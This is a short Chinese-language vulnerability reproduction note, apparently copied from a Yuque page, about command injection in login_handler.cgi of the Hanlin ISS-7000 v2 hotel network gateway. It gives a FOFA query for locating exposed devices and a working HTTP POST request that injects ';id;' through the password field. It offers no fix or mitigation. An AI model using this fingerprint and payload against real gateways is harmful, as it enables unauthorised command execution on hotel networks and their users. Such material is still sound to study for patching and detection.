# 瀚霖科技股份有限公司ISS-7000 v2网关login_handler.cgi存在命令执行漏洞

# 一、漏洞简介
 ISS-7000 v2网络网关服务器是台高性能的网关，提供各类酒店网络认证计费的完整解决方案。由于智慧手机与平板电脑日渐普及，人们工作之时开始使用随身携带的设备，因此无线网络也成为网络使用者基本服务的项目。ISS-7000 v2可登录300至1000终端设备同时上网，并发量是一般设备的好几倍。为了提供安全上网服务，本公司专利技术所设计的动态使用者帐户生成器，能避免非使用者侵入酒店内部网络。

# 二、影响版本
1.00.06 和1.00.08

# 三、资产测绘
    - fofa `<font style="color:rgb(221, 17, 68);">body="css/login_form_style-06.css"</font>`
+ 特征

![1731053389608-53172b55-f85a-4160-90a1-a46437c9e921.png](./img/2eQP4LJ8jemsjq4j/1731053389608-53172b55-f85a-4160-90a1-a46437c9e921-708438.png)

# 四 、漏洞复现
```java
POST /login_handler.cgi HTTP/1.1
Host: 
Content-Length: 79
Content-Type: application/x-www-form-urlencoded
Connection: close

username=admin&password=admin;id;&uilng=3&button=%E7%99%BB%E5%85%A5&Signin=
```

![1731053435815-51591c43-d512-4214-a447-edfb19d54653.png](./img/2eQP4LJ8jemsjq4j/1731053435815-51591c43-d512-4214-a447-edfb19d54653-365176.png)



> 更新: 2024-11-27 10:04:11  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zburq1ug9szxzm22>